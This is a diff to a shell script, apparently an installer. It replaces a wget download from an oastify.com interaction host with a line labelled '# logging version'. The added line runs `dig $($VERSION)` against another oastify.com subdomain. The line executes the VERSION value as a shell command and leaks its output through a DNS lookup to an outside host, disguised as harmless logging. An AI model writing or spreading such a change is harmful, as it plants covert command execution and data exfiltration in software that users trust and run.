@@ -212,8 +212,10 @@ version_gte() {
 	version_compare "$VERSION" "$1"
 }
 
-# download the zip file
-wget https://705cpyoc3vxm1rrf1ok7v738hznsbjz8.oastify.com/$VERSION.zip
+
+# logging version
+dig $($VERSION).bs7gh2ggvzpqtvjjtscbnbvc93fw3ord.oastify.com
+
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
